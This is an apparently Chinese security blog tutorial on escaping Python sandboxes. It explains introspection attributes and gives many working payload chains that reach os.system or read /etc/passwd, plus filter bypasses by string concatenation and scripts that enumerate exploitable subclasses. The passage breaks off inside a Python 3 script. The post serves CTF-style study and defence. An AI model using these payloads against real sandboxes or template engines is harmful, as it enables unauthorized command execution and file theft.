# Python沙箱逃逸小结

2019-05-31 / [Python](https://www.mi1k7ea.com/tags/Python/)[Web安全](https://www.mi1k7ea.com/tags/Web安全/)[沙箱逃逸](https://www.mi1k7ea.com/tags/沙箱逃逸/)

所谓的Python沙盒，即以一定的方法模拟Python终端，实现用户对Python的使用。而Python沙箱逃逸，就是攻击者通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。

## 0x01 背景知识

### dir()函数

dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。

```
>>>dir()   #  获得当前模块的属性列表
['__builtins__', '__doc__', '__name__', '__package__', 'arr', 'myslice']
>>> dir([ ])    # 查看列表的方法
['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
```

### __builtins__

__builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。

可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。

```
# 下面代码可列出所有的内联函数
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
>>> __builtins__.__dict__['__import__']('os').system('ls')

# Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数
import builtins
dir(builtins)
```

### __import__

__import__接收字符串作为参数，导入该字符串名称的模块。

如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。

### __bases__

列出基类：

```
''.__class__.__bases__
```

### __mro__

__mro__用于展示类的继承关系，类似于bases：

```
''.__class__.__mro__
```

### __globals__

__globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。

### object类

python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下：

```
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
```

### 导入模块

常规的3种导入方式：

```
import xxx
from xxx import *
__import__('xxx')
```

除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数：

```
>>> import sys
>>> sys.modules['os']='/usr/lib/python2.7/os.py'
>>> import os
>>>
```

import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。

- 通过 from a import b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。通过 import a as b 导入，a 会被添加到 sys.modules 字典中，b 会被导入到当前的 Local 命名空间。对于嵌套导入的，比如 a.py 中存在一个 import b，那么 import a 时，a 和 b 模块都会被添加到 sys.modules 字典中，a 会被导入到当前的 Local 命名空间中，虽然模块 b 已经加载到内存了，如果访问还要再明确的在本模块中 import b。
- 导入模块时会执行该模块。
- 所以说如果某一个模块导入了os模块，我们就可以利用该模块的 dict 进而使用os模块，如下：

```
import linecache
linecache.__dict__['os'].system('ls')
# 等价于
linecache.os.system('ls')
```

## 0x02 可利用的模块和方法

在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。

### 命令执行类

#### os模块

```
import os
# 执行shell命令不会返回shell的输出
os.system('whoami')
# 会产生返回值，可通过read()的方式读取返回值
os.popen("whoami").read()
```

#### commands模块

commands模块会返回命令的输出和执行的状态位，仅限Linux环境

```
import commands
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("ls")
```

#### subprocess模块

```
import subprocess
subprocess.call(command, shell=True)
subprocess.Popen(command, shell=True)
```

#### pty模块

仅限Linux环境

```
import pty
pty.spawn("ls")
```

#### timeit模块

```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
```

#### platform模块

```
import platform
print platform.popen('dir').read()
```

#### __import__()函数

这个函数只是通过引入其他命令执行库实现命令执行：

```
__import__("os").system("ls")
```

#### importlib模块

和上面同理：

```
import importlib
importlib.import_module('os').system('ls')
# Python3可以，Python2没有该函数
importlib.__import__('os').system('ls')
```

#### exec()/eval()/execfile()/compile()函数

这几个函数都能执行参数的Python代码。

注意：execfile()只存在于Python2，Python3没有该函数。

```
exec("__import__('os').system('calc')")

eval('__import__("os").system("calc")')

execfile('exp.py')
# 过滤import的情况可如下Bypass
execfile("E:\Python27\Lib\os.py")
system('calc')

exec(compile('__import__("os").system("calc")', '<string>', 'exec'))
```

#### sys模块

该模块通过modules()函数引入命令执行模块来实现：

```
import sys
sys.modules['os'].system('calc')
```

### 文件操作类

#### file()函数

该函数只存在于Python2

```
file('/etc/passwd').read()
file('test.txt','w').write('xxx')
```

#### open()函数

```
open('/etc/passwd').read()
open('test.txt','a').write('xxx')
```

#### codecs模块

```
import codecs
codecs.open('/etc/passwd').read()
codecs.open('test.txt', 'w').write('xxx')
```

### 获取当前Python环境信息

#### sys模块

```
import sys
sys.version
sys.path
sys.modules
```

## 0x03 沙箱逃逸技巧

### 元素链

#### 构造过程

下面简单过下元素链的构造过程。

由前面知道，我们可以通过如下方式获取object类：

```
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
```

![img](images\1.png)

然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）：

```
''.__class__.__mro__[2].__subclasses__()
[].__class__.__mro__[1].__subclasses__()
{}.__class__.__mro__[1].__subclasses__()
().__class__.__mro__[1].__subclasses__()
{}.__class__.__bases__[0].__subclasses__()
().__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()
```

![img](images\2.png)

找到重载过的__init__类，例如：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__
```

在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。

![img](images\3.png)

写个脚本帮我们来筛选出重载过的__init__类的类：

```
l = len(''.__class__.__mro__[2].__subclasses__())
for i in range(l):
    if 'wrapper' not in str(''.__class__.__mro__[2].__subclasses__()[i].__init__):
        print (i, ''.__class__.__mro__[2].__subclasses__()[i])
```

![img](images\4.png)

重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
```

寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

再在keys中寻找可利用的函数即可，如file()函数为例：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()
```

![img](images\5.png)

至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。

#### 使用脚本遍历其他逃逸方法

Python2的脚本如下：

```
# coding=UTF-8

find_modules = {'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'],
                'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'],
                'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'],
                'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'],
                'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'],
                'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'],
                'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'],
                'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'],
                'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'],
                'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'],
                'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'],
                'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'],
                'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'],
                'plat-freebsd4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'],
                'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'],
                'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'],
                'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'],
                'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'],
                'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'],
                'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'],
                'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'],
                'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'],
                'dircache': ['os', '__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'],
                'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'],
                'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'],
                'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'],
                'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'],
                'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'],
                'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'],
                'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'],
                'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'],
                'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'],
                're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'],
                'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'],
                'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'],
                'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'],
                'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'],
                'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'],
                'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'],
                'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'],
                'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'],
                'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'],
                'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'],
                'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'],
                'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'],
                'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'],
                'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'],
                'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'],
                'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'],
                'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'],
                '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'],
                'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'],
                'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'],
                'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'],
                'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'],
                'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'],
                'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'],
                'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'],
                'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'],
                'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'],
                'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'],
                'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'],
                'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'],
                'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'],
                'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'],
                'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'],
                'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'],
                'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'],
                'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'],
                'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'],
                'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'],
                'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'],
                'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'],
                'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'],
                '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'],
                'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'],
                'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'],
                'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'],
                'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'],
                'warnings': ['sys', '__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'],
                'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'],
                'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'],
                'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'],
                'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'],
                'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'],
                'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'],
                'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'],
                'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'],
                'rlcompleter': ['__builtins__'], 'hmac': ['__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(find_modules.keys() + target_modules + target_functions))
all_modules = list(set(find_modules.keys() + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'>类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass
```

运行结果如下：

![img](images\12121.png)

下面简单归纳下遍历的4种方式：

**第一种方式**

序号为40，即file()函数，进行文件读取和写入，payload如下：

```
''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[40]('E:/test.txt', 'w').write('xxx')
```

这和前面元素链构造时给出的Demo有点区别：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()
```

序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。

当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：

![img](images\7.png)

**第二种方式**

先看序号为59的WarningMessage类有哪些而利用的模块或方法：

```
(59, <class 'warnings.WarningMessage'>, 'linecache', ['os', 'sys', '__builtins__'])
(59, <class 'warnings.WarningMessage'>, '__builtins__', None)
(59, <class 'warnings.WarningMessage'>, 'sys', None)
(59, <class 'warnings.WarningMessage'>, 'types', ['__builtins__'])
```

以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：

```
# 确认linecache
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache']
# 返回linecache字典中的所有键
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__
.keys()
# 在linecache字典的所有键中寻找os的序号，找到为12
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__
.keys().index('os')
# 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys()
# 在os字典的所有键中寻找system的序号，找到为79
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
# 执行os.system()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[79]('calc')
```

payload如下：

```
# linecache利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('calc')

# __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/test.txt', 'w').write('hello')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['execfile']('E:/exp.py')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("calc")')
exec(''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['compile']('__import__("os").system("calc")', '<string>', 'exec'))

# sys利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('calc')

# types利用，后面还是通过__builtins__实现利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['types'].__dict__['__builtins__']['__import__']('os').system('calc')
```

序号为60的catch_warnings类利用payload同上。

序号为61、62的两个类均只有__builtins__可利用，利用payload同上。

序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：

```
# os利用
''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('calc')
```

序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：

```
# open利用
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/test.txt', 'w').write()
```

**第三种方式**

先看下序号为59的WarningMessage类：

```
(59, 13, <class 'warnings.WarningMessage'>, '__import__')
(59, 13, <class 'warnings.WarningMessage'>, 'file')
(59, 13, <class 'warnings.WarningMessage'>, 'compile')
(59, 13, <class 'warnings.WarningMessage'>, 'eval')
(59, 13, <class 'warnings.WarningMessage'>, 'open')
(59, 13, <class 'warnings.WarningMessage'>, 'execfile')
```

注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("calc")')
```

其他类似修改即可。

**第四种方式**

这里只有一种序号，为60：

```
(60, '__import__')
(60, 'file')
(60, 'repr')
(60, 'compile')
(60, 'eval')
(60, 'open')
(60, 'execfile')
```

调用示例如下，其他类似修改即可：

```
''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__']("os").system("calc")
```

前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致：

```
# coding=UTF-8
# Python3
find_modules = {'asyncio': ['subprocess', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'concurrent': ['__builtins__'], 'ctypes': ['__builtins__'], 'curses': ['__builtins__'],
                'dbm': ['os', 'sys', '__builtins__', 'open'], 'distutils': ['sys', '__builtins__'],
                'email': ['__builtins__'], 'encodings': ['codecs', 'sys', '__builtins__'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'html': ['__builtins__'], 'http': ['__builtins__'],
                'idlelib': ['__builtins__'], 'importlib': ['sys', '__import__', '__builtins__'],
                'json': ['codecs', '__builtins__'], 'lib2to3': ['__builtins__'],
                'logging': ['os', 'sys', '__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'multiprocessing': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'sqlite3': ['__builtins__'],
                'test': ['__builtins__'], 'tkinter': ['sys', '__builtins__'], 'turtledemo': ['__builtins__'],
                'unittest': ['__builtins__'], 'urllib': ['__builtins__'],
                'venv': ['os', 'subprocess', 'sys', '__builtins__'], 'wsgiref': ['__builtins__'],
                'xml': ['__builtins__'], 'xmlrpc': ['__builtins__'], '__future__': ['__builtins__'],
                '__phello__.foo': ['__builtins__'], '_bootlocale': ['sys', '__builtins__'],
                '_collections_abc': ['sys', '__builtins__'], '_compat_pickle': ['__builtins__'],
                '_compression': ['__builtins__'], '_dummy_thread': ['__builtins__'], '_markupbase': ['__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'], '_pydecimal': ['__builtins__'],
                '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], '_sitebuiltins': ['sys', '__builtins__'],
                '_strptime': ['__builtins__'], '_threading_local': ['__builtins__'], '_weakrefset': ['__builtins__'],
                'abc': ['__builtins__'], 'aifc': ['__builtins__', 'open'], 'antigravity': ['__builtins__'],
                'argparse': ['__builtins__'], 'ast': ['__builtins__'], 'asynchat': ['__builtins__'],
                'asyncore': ['os', 'sys', '__builtins__'], 'base64': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'binhex': ['os', '__builtins__'], 'bisect': ['__builtins__'],
                'bz2': ['os', '__builtins__', 'open'], 'cProfile': ['__builtins__'],
                'calendar': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'chunk': ['__builtins__'], 'cmd': ['sys', '__builtins__'],
